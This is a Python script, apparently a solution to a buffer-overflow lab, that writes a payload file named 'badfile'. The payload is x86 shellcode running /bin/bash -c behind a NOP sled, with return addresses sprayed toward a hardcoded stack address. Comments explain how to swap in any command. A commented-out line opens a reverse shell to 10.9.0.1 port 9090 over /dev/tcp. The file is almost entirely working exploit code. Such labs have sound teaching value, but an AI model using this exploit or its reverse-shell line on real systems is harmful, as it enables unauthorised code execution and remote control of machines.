#!/usr/bin/python3
import sys

shellcode= (
"\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # You can modify the following command string to run any command.
   # You can even run multiple commands. When you change the string,
   # make sure that the position of the * at the end doesn't change.
   # The code above will change the byte at this position to zero,
   # so the command string ends here.
   # You can delete/add spaces, if needed, to keep the position the same. 
   # The * in this line serves as the position marker         * 
   #"/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1           *"
   "echo 'Hi! You have been hacked :('                        *"
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload

start = 517 - len(shellcode)         		# Change this number 
content[start:start + len(shellcode)] = shellcode


# Address of the start of the buffer
buffer = 0xffffd2c8
# point to the beginning of our NOP's, it will catch the shellcode
ret    = buffer + 300

# add 75 return addresses to the buffer (to fill the potential range)
ret_splash = 75
for offset in range(ret_splash):
	content[offset*4:offset*4 + 4] = (ret).to_bytes(4,byteorder='little')

##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
